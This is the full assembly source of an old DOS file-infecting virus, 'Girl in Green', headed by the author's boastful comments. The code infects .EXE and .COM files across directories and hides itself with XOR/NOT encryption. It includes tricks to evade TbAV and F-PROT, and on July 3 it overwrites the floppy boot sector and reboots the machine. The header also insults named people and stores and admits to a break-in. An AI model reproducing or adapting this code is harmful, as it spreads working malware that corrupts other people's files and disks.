GREEN_GIRL SEGMENT
;
; The "Girl in Green" Virus by The Methyl-Lated Spirit
;
; Alright, here is the low-down on this virus.
;       - XOR and NOT encryption
;       - Boot block message display <see below>
;       - .EXE and .COM infection <in that order>
;       - Direct Action <I SWEAR the next will be TSR>
;       - INT 042H Handler
;       - Teensy weensy little bit of anti-debugging shit
;       - Neat activation <boot block, see below>
;       - Directory Traversal
;       - Restores original Date/Time/Attributes
;       - Won't infect Windows .EXE's
;       - Won't fuck up too often because of extensive testing of it
;
; A short note on the boot block:
;
; This virus has a boot block, yes, thats right, a boot block!
; On July the 3rd, MY birthday, it will capture a picture of the first
; sector of the disk in A: into a file on the A: called boot.sec, then
; it will overwrite the original bootblock with some code, and when you
; re-boot onto that disk... well, I'll let you see yourself <it aint
; destructive, and that boot.sec is there in case you wanna restore it,
; aren't I a nice guy?  *G*>.  It was made originally for EGA, but should
; work on other monitors too, although the colours may be weird.
;
; Basically, there is no easy way to go through this virus.  It is
; a great desendant from Spaghetti <yes, the food>.  It jumps here, there
; everywhere, and, well, I don't believe I've created such a monster.
; Here is a little look see at it.  It goes through 2 phases determined
; by the run_count counter.  A setting of 1 means it is the first time through
; and that it should look for .EXE files to infect.  After that, it is set to
; 2 and it searches for .COM files to infect.  It will only infect 1 file on
; each run.  After that, when it goes to restart the host, it looks at the
; com_or_exe variable.  A setting of 1 means the current file is a .EXE and
; should be restored in that way, and a setting of 2 means the current file
; is a .COM file and should be restored as such.  These variables are
; temporarily changed while writing the virus to a new file to reflect
; the hosts new attributes.
;
; Dedications:
;       - The knock-out babe on the 424 bus home from school every day
;
; Big time fuck you's to:
;       - Peter Doyle.  FACE IT!  COMPUSERVE SUX!
;       - Dick Smith's Shops.  HAHAHAHA, THE TOILET BOWL VIRUS STRIKES AGAIN!
;       - MYER stores in Perth
;              "If you do not remove yourself from that computer, I
;               shall have to call security".  HAHAHAHAHAHAHAHAHAHA
;       - Deth : MYER was fun, but you are a liar and a theif, FUCK YOU
;               : You don't NARK on people you did a B&E with just because
;               : you're having PMS, get a life arsehole.  Liquid Plastic SUX.
;
; Greets to:
;       - Ral : Techno roqs just about as much as Jim Morrison
;       - Grey : Thanx for the chats dude
;       - Rainbow Bright/Telco Ray : Haven't seen u on the net laterly!
;       - Shalazar : What is there to say?  You're a dude.
;       - Titanium Warrior : I'm gunna get you!
;       - And all those wonderfull people in GrayLands that gave me this nice
;               padded cell so I wouldn't bang my head to hard on the walls
;               when I got frustrated debugging this thing :)
;
; Sources:
;       - Much code from my first virus, The Toilet Bowl
;       - VLAD, the info on how to check for WinEXE files
;       - 40-hex article by Dark Avenger on .EXE infections
;       - 40-hex article on how boot-sectors work <I just needed
;               the offset in memory where they are loaded, 0:7C00>
;
; Reasons for writing it:
; If you're wondering why this is called the "Girl in Green" virus, well, here
; is the answer.  I am Methyl, hanging on #AUSSIES alot, and I met a
; BEAUTIFUL girl on da bus, and she was dressed in her green school uniform.
; Well, I'm, of course, gunna ask her out when I get sum guts, but first
; I thought I'd be really kind and create a virus to show my love for her!  :>
;
; So if you <you know who you are> were wearing a slazenger suit into
; Karrinyup on Mothers Day, and a phreak in white with the wierdest
; pair of jeans in the world on came up to you and said "Hello", then,
; I LOVE YOU! <evil grin>
                                ;
        ORG 0H                  ;
                                ;
START:                          ; Host file
        MOV AH,4CH              ;
        INT 21H                 ;
                                ;
BEGIN:                          ;
        MOV AH,1                ; TbAV will go no further :)
        INT 016H                ;
                                ;
        JMP $+3                 ; Stop F-PROT flagging this as a virus
        DB 081H, 0E8H, 00H, 00H ;
                                ;
GET_DELTA:                      ;
        MOV BP,SP               ;
        SUB WORD PTR [SS:BP], OFFSET GET_DELTA
        MOV AX,[SS:BP]          ;
        ADD SP,2                ;
        MOV BP,AX               ;
                                ;
        PUSH DS                 ; Save PSP segment
        PUSH ES                 ;
        MOV DS,CS               ; Make ES=DS=CS
        MOV ES,DS               ;
                                ;
; I've done a little thing here that makes this baby easier to compile.
; When first compiled, the variable enc_or_not will equal 0, and so the
; encrypting routines shan't be run, because the virus has not yet encrypted
; itself.  After the first run, this value is changed forever to be 1, so that
; encryption is always carried out on the new infected files.  It takes up a
; bit of space, but, like I said, easier to compile.
                                ;
                                ;
        CMP BYTE PTR [OFFSET ENC_OR_NOT+BP], 0
        JE START_XOR            ;
                                ; Call encryption routines
        CALL NOTTER             ;
        CALL XORER              ;
                                ;
START_XOR:                      ; Begin XOR'ing here
        MOV BYTE PTR [OFFSET ENC_OR_NOT+BP], 1
                                ; Determine which method will be used later
                                ; to jump back to host, and restores the
                                ; appropriate host bytes.
        CMP BYTE PTR [OFFSET COM_OR_EXE+BP], 1
        JE EXE_BYTES            ;
                                ; This will restore .COM files
        LEA SI,[OFFSET ORIG_3+BP]
        MOV DI,0100H            ;
        MOVSB                   ;
        MOVSB                   ;
        MOVSB                   ;
        JMP RESET               ;
                                ;
EXE_BYTES:                      ; This is for .EXE's
        MOV WORD PTR [ORIG_CSIP+BP], WORD PTR [TEMP_CSIP+BP]
        MOV WORD PTR [ORIG_SSSP+BP], WORD PTR [TEMP_SSSP+BP]
        MOV WORD PTR [ORIG_CSIP+BP+02H], WORD PTR [TEMP_CSIP+BP+02H]
        MOV WORD PTR [ORIG_SSSP+BP+02H], WORD PTR [TEMP_SSSP+BP+02H]
                                ;
RESET:                          ; Reset run counter
        MOV BYTE PTR [OFFSET RUN_COUNT+BP],1
                                ;
SET_NEW_DTA:                    ; Make a new DTA
        MOV AH, 01AH            ;
        LEA DX, OFFSET NEW_DTA_AREA+BP
        INT 021H                ;
                                ;
SAVE_CURRENT_DIR:               ; Save current directory for traversal functions
        MOV AH, 047H            ;
        XOR DL, DL              ;
        LEA SI, OFFSET DIR_BUFFER+BP
        INT 021H                ;
                                ;
SET_ERRORS:                     ; Make a new error handler to stop
                                ; write protect errors propping up.
        MOV AX, 03524H          ;
        INT 21H                 ;
                                ;
        LEA DI, OFFSET OLD_ERROR+BP
        MOV [DI],ES             ;
        ADD DI,2                ;
        MOV [DI],BX             ;
                                ;
        MOV AX,02524H           ;
        LEA DX, OFFSET NEW_ERROR_HANDLER+BP
        INT 21H                 ;
                                ;
        MOV ES, DS              ; Restore modified ES register
; *********************************************************************
; Activation routine for July 3rd.
;
                                ;
        MOV AH, 02AH            ; Get date
        INT 21H                 ;
                                ;
MONTH:                          ;
        CMP DH, 07H             ; Check if it is July
        JE DAY                  ;
        JMP DATE_TEST_PASSED    ;
                                ;
DAY:                            ;
        CMP DL, 03H             ; Check if it is the 3rd
        JE BOOTER               ;
        JMP DATE_TEST_PASSED    ;
                                ; If it got to this point, ITS MY BIRTHDAY!
BOOTER:                         ;
        MOV AX,0201H            ; Read old boot block data
        MOV CX,1                ;
        XOR DX,DX               ;
        LEA BX,OFFSET OLD_DATA+BP;
        INT 013H                ;
                                ;
        MOV AH,03CH             ; Create A:\BOOT.SEC
        XOR CX,CX               ;
        LEA DX,OFFSET BOOT_NAME+BP
        INT 21H                 ;
                                ;
        JC QUIT                 ; Disk not there maybe?
                                ;
        XCHG BX,AX              ; Write A:\BOOT.SEC
        MOV AH,040H             ;
        MOV CX,512              ;
        LEA DX,OFFSET OLD_DATA+BP
        INT 021H                ;
                                ;
        MOV AH,03EH             ;
        INT 021H                ; Close file with boot sector inside
                                ;
        MOV AX,0301H            ; Write new boot sector to floppy
        MOV CX,1                ;
        XOR DX,DX               ;
        LEA BX, OFFSET START_WRITE+BP
        INT 13H                 ;
                                ;
QUIT:                           ; Reboot computer to load up new boot segment
        MOV AX,040H             ; Set up for a warm reboot <quicker>
        MOV DS,AX               ;
        MOV AX, 012H            ;
        MOV [072H], AX          ;
                                ;
        DB 0EAH                 ; Do a jump to Offset:Segment following
        DB 00,00,0FFH,0FFH      ; which is FFFF:0000 as segment:offset
                                ;
;***********************************************************************
; This is the boot_block start

START_WRITE:                    ;
        CLD                     ;
                                ;
NO_CURSOR:                      ;
        MOV AH,1                ;
        MOV CX,02000H           ;
        INT 010H                ;
                                ;
        MOV AX,0B800H           ; Colour video segment
        MOV ES,AX               ;
        XOR DI,DI               ;
        LEA SI, 07C00H+(OFFSET MESSAGE-OFFSET START_WRITE)
                                ;
LOOPY_GREEN:                    ;
        MOV CX, 23              ;
        REP MOVSW               ;
        SUB SI, 46              ;
        LEA AX, 07C00H+(OFFSET LOOPY_GREEN-OFFSET START_WRITE)
        JMP AX                  ;
                                ;
MESSAGE DB 'I',02,32 ,02,03 ,02,32 ,02,'Y',02,'O',02,'U',02,32,02
        DB 'G',02,'I',02,'R',02,'L',02,32 ,02,'I',02,'N',02
        DB 32 ,02,'G',02,'R',02,'E',02,'E',02,'N',02,'!',02,32,02
                                ;
; This is the boot_block end
;***********************************************************************
                                ;
DATE_TEST_PASSED:               ; Find first file
        MOV AH,04EH             ;
        JMP FINDER              ;
                                ;
CHANGE_DIR:                     ; Go down in directory structure
        MOV AH,03BH             ;
        LEA DX,OFFSET CHANGE_TO+BP
        INT 021H                ;
        JC END_ALL              ; In root, no more files
                                ;
        MOV AH,04EH             ; Since it is is a new dir, find first file
        JMP FINDER              ;
                                ;
RESET_ATTRIBS:                  ; Reset file time/date
        MOV AX,05701H           ;
        MOV CX,[OFFSET TIME+BP] ;
        MOV DX,[OFFSET DATE+BP] ;
        INT 021H                ;
        RET                     ;
                                ;
CLOSE_FILE:                     ; Close file and reset attributes
        MOV AH,03EH             ;
        INT 021H                ;
                                ;
        MOV AX,04301H           ;
        MOV CX,[OFFSET ATTRIBS+BP]
        LEA DX,OFFSET NEW_DTA_AREA+1EH+BP
        INT 021H                ;
        RET                     ;
                                ;
FINDER:                         ; Find first/next routine
        LEA DX,[OFFSET FILE_MASK+BP]
        MOV CX,0007H            ;
        INT 021H                ;
                                ;
        JC CHANGE_DIR           ; Change dir if no more files
        JMP FILE_FOUND          ;
                                ;
DO_OTHER:                       ; Change file mask.  This is the 2nd
                                ; pass, so look for .COM's instead of .EXE's
        MOV BYTE PTR [OFFSET RUN_COUNT+BP],2
        MOV WORD PTR [OFFSET FILE_MASK+BP+2],'OC'
        MOV BYTE PTR [OFFSET FILE_MASK+BP+4],'M'
        MOV AH,04EH             ;
        JMP FINDER              ;
                                ;
END_ALL:                        ;
        MOV AH,03BH             ; Change to original dir
        LEA DX,OFFSET SLASH+BP  ;
        INT 021H                ;
                                ; Do second pass if not done already
        CMP BYTE PTR [OFFSET RUN_COUNT+BP], 1
        JE DO_OTHER             ;
                                ;
                                ; Reload original error handler
        MOV DX,[OFFSET OLD_ERROR+BP+02H]
        MOV DS,[OFFSET OLD_ERROR+BP]
        MOV AX,02524H           ;
        INT 021H                ;
                                ;
        POP ES                  ; Reload original DS, ES
        POP DS                  ;
                                ; Determine host file type
        CMP BYTE PTR [OFFSET COM_OR_EXE+BP],1
        JE EXE_RESTORE          ;
                                ;
        MOV AH,01AH             ; This will restore a .COM file
        MOV DX,080H             ;
        INT 021H                ;
                                ;
        MOV DX,0100H            ;
        JMP DX                  ;
                                ;
EXE_RESTORE:                    ; This will restore a .EXE file
                                ;
        MOV AH,1AH              ; Reset original PSP
        MOV DX,080H             ;
        INT 021H                ;
                                ;
        MOV AX,ES               ; Get CS:IP ready to jump to
        ADD AX,010H             ;
        ADD WORD PTR CS:[BP+ORIG_CSIP+02H],AX
        ADD AX, WORD PTR CS:[BP+ORIG_SSSP+02H]
                                ;
        CLI                     ; Restore stack segment and stack pointer
        MOV SP, WORD PTR CS:[BP+ORIG_SSSP]
        MOV SS,AX               ;
        STI                     ;
                                ;
        DB 0EAH                 ; Far Jump Offset:Segment following
                                ;
;***************************************************************************
; Data area
                                ;
ORIG_CSIP DW 0,0                ; Original CS:IP value
ORIG_SSSP DW 0,0                ; Original SS:SP value
                                ;
TEMP_CSIP DW 0,0                ; Temporary CS:IP value
TEMP_SSSP DW 0,0                ; Temporary SS:SP value
                                ;
CHANGE_TO DB '..',0             ; For directory traversal functions
FILE_MASK DB '*.EXE',0          ; File mask <DUH!>
                                ;
BOOT_NAME DB 'A:\BOOT.SEC',00   ; Holds original boot sector of a diskette
                                ;
COM_OR_EXE DB 1                 ; 1=exe, 2=com
RUN_COUNT DB 1                  ; 1=first, 2=second
                                ;
JUMPING DB 0E9H,00,00           ; Jump construct for a .COM file
ORIG_3 DB 3 DUP(?)              ; Original .COM file bytes
                                ;
; End Data area
;***************************************************************************
                                ;
POINTER_MOVER:                  ;
        XOR CX,CX               ;
        XOR DX,DX               ;
        MOV AH, 042H            ;
        INT 021H                ;
        RET                     ;
                                ;
COM_TIME:                       ; Checks for ibmdos.com, ibmbio.com, command.com
                                ; So it works on PC/DOS and MS/DOS
        MOV AL, BYTE PTR [OFFSET NEW_DTA_AREA+BP+01EH+2]
        CMP AL,'M'              ;
        JNE NOT_DOS_FILE        ;
        JMP NOPE                ;
                                ;
NOT_DOS_FILE:                   ;
        MOV AL,02H              ;
        CALL POINTER_MOVER      ;
                                ;
        SUB DX,1                ; Jump to end of file-1
        SBB CX,0                ;
        MOV AX,04202H           ;
        INT 021H                ;
                                ;
        MOV AH,03FH             ; Read last byte of file
        MOV CX,1                ;
        LEA DX,OFFSET ORIG_3+BP ;
        INT 021H                ;
                                ;
        MOV AL,[OFFSET ORIG_3+BP]
        CMP AL,'\'              ;
        JNE CHECK_IT            ; Infect file
                                ;
NOPE:                           ; Can't infect for some reason or another
        CALL RESET_ATTRIBS      ;
        CALL CLOSE_FILE         ;
        MOV AH,04FH             ;
        JMP FINDER              ; Already infected (It's my BAAAABBYYYY)
                                ;
CHECK_IT:                       ;
        XOR AL,AL               ; Beginning of file
        CALL POINTER_MOVER      ;
                                ;
        MOV AH,03FH             ; Read files first 3 bytes
        MOV CX,3                ;
        LEA DX,[OFFSET ORIG_3+BP]
        INT 021H                ;
                                ;
        MOV AL,[OFFSET ORIG_3+BP]
        ADD AL,[OFFSET ORIG_3+BP+1]
        CMP AX,'M'+'Z'          ;
        JE NOPE                 ;
                                ;
INFECT_COM:                     ;
        MOV AL,02H              ;
        CALL POINTER_MOVER      ;
                                ;
        SUB AX,3                ; Calculate jump offset
        MOV [OFFSET JUMPING+BP+1],AX
                                ;
        XOR AL,AL               ; Beginning of file
        CALL POINTER_MOVER      ;
                                ;
        MOV CX,3                ; Write jump bytes
        MOV AH,040H             ;
        LEA DX,OFFSET JUMPING+BP;
        INT 021H                ;
                                ;
                                ; So that the infected file will look for
                                ; .EXE's on the first run and not .COM's,
                                ; this code here must be added
        MOV WORD PTR [OFFSET FILE_MASK+BP+2],'XE'
        MOV BYTE PTR [OFFSET FILE_MASK+BP+4],'E'
                                ; Make sure that when the virus runs of it's new
                                ; .COM host, it knows it and isn't running as if
                                ; it was on the old host <i.e. restore host
                                ; as a .COM and not a .EXE>
        MOV AL,[OFFSET COM_OR_EXE+BP]
        PUSH AX                 ;
        MOV BYTE PTR [OFFSET COM_OR_EXE+BP],2
        JMP END_WRITER          ;
                                ;
FILE_FOUND:                     ;
        MOV AX, 04300H          ; Get and save attribs
        LEA DX,[OFFSET NEW_DTA_AREA+BP+01EH]
        INT 21H                 ;
                                ;
        MOV [OFFSET ATTRIBS+BP],CX
        MOV WORD PTR [OFFSET TIME+BP],[OFFSET NEW_DTA_AREA+BP+016H]
        MOV WORD PTR [OFFSET DATE+BP],[OFFSET NEW_DTA_AREA+BP+018H]
                                ;
CHANGE_ATTRIBS_NORMAL:          ; Change attributes to NULL
        MOV AX,04301H           ;
        XOR CX,CX               ;
        LEA DX,[OFFSET NEW_DTA_AREA+BP+01EH]
        INT 021H                ;
        JNC OPEN_FILE           ;
        MOV AH,04FH             ;
        JMP FINDER              ; Somefink went wrong!
                                ;
OPEN_FILE:                      ; Open da file
        MOV AX,03D02H           ;
        LEA DX,OFFSET NEW_DTA_AREA+BP+01EH
        INT 021H                ;
        JNC WHAT_WRITE_ROUTINE  ;
        MOV AH,04FH             ;
        JMP FINDER              ; Somefink else went wrong!
                                ;
WHAT_WRITE_ROUTINE:             ; Write to a .COM or .EXE
        XCHG BX,AX              ; Put file handle in BX
        CMP BYTE PTR [OFFSET FILE_MASK+BP+2],'E'
        JE CHECK_INFECTED       ;
        JMP COM_TIME            ;
                                ;
CHECK_INFECTED:                 ; Read in file header
        MOV CX,01AH             ; .EXE header is (01Ah bytes)
        MOV AH,3FH              ;
        LEA DX,OFFSET FILE_HEADER+BP
        INT 021H                ;
                                ; Check if it is already infected
        CMP WORD PTR [OFFSET FILE_HEADER+BP+012H],'GG'
        JNE TEST_WIN            ;
        JMP NOPE                ;
                                ;
NEW_ERROR_HANDLER:              ; New INT 024H handler
        MOV AL,3                ; Fail system call <VLAD said to do this>
        IRET                    ;
                                ;
TEST_WIN:                       ;
        MOV AX,[OFFSET FILE_HEADER+BP+018H]
        CMP AX,040H             ;
        JB MODIFY_HEADER        ; Not windows file
        JMP NOPE                ; Is windows file
                                ;
MODIFY_HEADER:                  ; Begin transmorgification of the header
        MOV AL,02H              ; Get file size for later on
        CALL POINTER_MOVER      ;
                                ;
        PUSH BX                 ; Save handle
        PUSH DX                 ; Save file size
        PUSH AX                 ;
                                ; TEMP_CSIP = Offset : Segment
        LES AX, DWORD PTR [OFFSET FILE_HEADER+BP+014H]
        MOV WORD PTR [BP+OFFSET TEMP_CSIP], AX
        MOV WORD PTR [BP+OFFSET TEMP_CSIP+02H], ES
                                ; Save stack pointer
                                ; TEMP_SSSP = Offset : Segment
        LES AX, DWORD PTR [OFFSET FILE_HEADER+BP+0EH]
        MOV WORD PTR [BP+OFFSET TEMP_SSSP],ES
        MOV WORD PTR [BP+OFFSET TEMP_SSSP+02H],AX
                                ; Convert header size to bytes
                                ; <originally in paragraphs>
        MOV AX, WORD PTR [BP+FILE_HEADER+08H]
        MOV CL,04H              ;
        SHL AX,CL               ;
                                ;
        XCHG BX,AX              ; BX now holds the header size in bytes
                                ;
        POP AX                  ; Get file size into DX:AX
        POP DX                  ;
                                ;
        PUSH AX                 ; Save file size for later AGAIN
        PUSH DX                 ;
                                ;
        SUB AX,BX               ; Take header size from file size
        SBB DX,0                ;
                                ;
        MOV CX,010H             ; Make it segment:offset form
        DIV CX                  ;
                                ; Write new entry point
        MOV WORD PTR [OFFSET FILE_HEADER+BP+014H],DX
        MOV WORD PTR [OFFSET FILE_HEADER+BP+016H],AX
                                ; Write new Stack
                                ; Pointer and....
        MOV WORD PTR [OFFSET FILE_HEADER+BP+010H],0
                                ; Segment!
        MOV WORD PTR [OFFSET FILE_HEADER+BP+0EH],AX
                                ; Write ID bytes
        MOV WORD PTR [OFFSET FILE_HEADER+BP+012H],'GG'
                                ;
        POP DX                  ; Get file length
        POP AX                  ;
                                ; Add virus size
        ADD AX,OFFSET END_VIRUS-OFFSET BEGIN
        ADC DX,0                ;
                                ;
        MOV CL,9                ;
        PUSH AX                 ; Save file size+virus size
                                ;
        SHR AX,CL               ;
        ROR DX,CL               ;
        STC                     ;
        ADC DX,AX               ; File size in pages
        POP AX                  ;
        AND AH,1                ; MOD 512
                                ; Write new file size
        MOV WORD PTR [BP+OFFSET FILE_HEADER+04H],DX
        MOV WORD PTR [BP+OFFSET FILE_HEADER+02H],AX
                                ; Increase minimum memory requirements to
                                ; ORIG_MEM + VIRUS_MEM = TOTAL_MEM 8)
        MOV AX,OFFSET END_FILE-OFFSET BEGIN
        MOV CL,4                ;
        SHR AX,CL               ;
                                ;
        ADD AX,WORD PTR [BP+OFFSET FILE_HEADER+0AH]
        MOV WORD PTR [BP+OFFSET FILE_HEADER+0AH],AX
                                ;
        POP BX                  ; Get handle again
                                ;
MOOWAAHAAHAAHAA:                ; Infect the wanker!
        XOR AL,AL               ; Move to da start of da file
        CALL POINTER_MOVER      ;
                                ;
        MOV CX,01AH             ; Write header
        MOV AH,040H             ;
        LEA DX,OFFSET FILE_HEADER+BP
        INT 021H                ;
                                ; So that the virus, when executing of its
                                ; new host knows that it will restore the bytes
                                ; as if attatched to a .EXE file
        MOV AL, BYTE PTR [OFFSET COM_OR_EXE+BP]
        PUSH AX                 ;
        MOV BYTE PTR [OFFSET COM_OR_EXE+BP],1
                                ;
END_WRITER:                     ;
        MOV AL,02H              ; Move to da end of da file
        CALL POINTER_MOVER      ;
                                ;
MAKE_NEW_ENC_VALUE:             ; Get a new random encryption value
        MOV AH,2CH              ;
        INT 21H                 ;
        MOV BYTE PTR [OFFSET ENCRYPTION_VALUE+BP],DL
                                ;
END_XOR:                        ; End XOR here
                                ; Make it my BAAAABBYYYY
        CALL XORER              ;
        CALL NOTTER             ;
                                ;
        MOV CX,OFFSET END_VIRUS-OFFSET BEGIN
        MOV AH,40H              ;
        LEA DX,OFFSET BEGIN+BP  ;
        INT 021H                ;
                                ;
        CALL NOTTER             ; Decrypt virus
        CALL XORER              ;
                                ; Restore original com_or_exe value
        POP AX                  ;
        MOV BYTE PTR [OFFSET COM_OR_EXE+BP],AL
                                ;
        CALL RESET_ATTRIBS      ;
        CALL CLOSE_FILE         ;
        JMP END_ALL             ;
                                ;
                                ;
XORER:                          ;
        CLD                     ; String instruction increment
        MOV ES,CS               ;
        MOV AH, [OFFSET ENCRYPTION_VALUE+BP]
        MOV CX, OFFSET END_XOR-OFFSET START_XOR
        LEA SI, [OFFSET START_XOR+BP]
        MOV DI, SI              ;
                                ;
XOR_LOOPER:                     ;
        LODSB                   ;
        XOR AL,AH               ;
        STOSB                   ;
        LOOP XOR_LOOPER         ;
        RET                     ;
                                ;
NOTTER:                         ;
        CLD                     ; Make sure string instructions increment
        MOV ES,CS               ;
        MOV CX,OFFSET NOTTER-OFFSET XORER
        LEA SI,[OFFSET XORER+BP]
        MOV DI,SI               ;
                                ;
NOT_LOOPER:                     ;
        LODSB                   ;
        NOT AL                  ;
        STOSB                   ;
        LOOP NOT_LOOPER         ;
        RET                     ;
                                ;
ENCRYPTION_VALUE DB 0           ;
ENC_OR_NOT DB 0                 ; To encrypt or not to encrypt
SLASH DB '\'                    ; For directory traversal functions
                                ;
END_VIRUS:                      ; Everything from here on is not written
                                ; to infected files
                                ;
DIR_BUFFER DB 64 DUP (?)        ; For directory traversal functions
NEW_DTA_AREA DB 128 DUP (?)     ; New DTA place
ATTRIBS DW 0                    ; Buffer for file attributes
TIME DW 0                       ;    "    "    "  time
DATE DW 0                       ;    "    "    "  date
FILE_HEADER DB 01AH DUP (?)     ; File Header Read/Write Buffer
OLD_ERROR DW 0,0                ; Hold old error handler address
OLD_DATA DB 512 DUP (?)         ; Holds old boot block
                                ;
END_FILE:                       ;
GREEN_GIRL ENDS                 ;
END BEGIN                       ;
